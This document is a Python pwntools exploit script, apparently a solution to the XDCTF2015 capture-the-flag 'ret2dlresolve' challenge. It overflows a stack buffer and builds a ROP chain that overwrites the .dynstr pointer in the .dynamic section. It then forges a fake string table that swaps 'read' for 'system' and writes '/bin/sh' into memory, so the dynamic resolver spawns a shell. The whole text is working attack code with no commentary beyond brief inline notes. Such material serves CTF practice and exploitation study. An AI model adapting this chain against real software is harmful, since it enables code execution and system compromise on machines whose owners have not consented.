from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "i386"
p = process("./ret2dlresolve")
rop = ROP("./ret2dlresolve")
elf = ELF("./ret2dlresolve")

p.recvuntil(b"Welcome to XDCTF2015~!\n")

DT_STRTAB = 0x0804B14C
fake_strtab = 0x0804B228
sec_instr = 0x08049066

offset = 112
rop.raw(offset * b"a")
rop.read(0, DT_STRTAB + 4, 4)  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name(".dynstr").data()
dynstr = dynstr.replace(b"read", b"system")
rop.read(0, fake_strtab, len((dynstr)))  # construct a fake dynstr section
rop.read(0, fake_strtab + 0x100, len(b"/bin/sh\x00"))  # read /bin/sh\x00
rop.raw(sec_instr)  # the second instruction of read@plt
rop.raw(0xDEADBEEF)
rop.raw(fake_strtab + 0x100)

assert len(rop.chain()) <= 256
rop.raw(b"a" * (256 - len(rop.chain())))
p.send(rop.chain())
p.send(p32(fake_strtab))
p.send(dynstr)
p.send(b"/bin/sh\x00")
p.interactive()
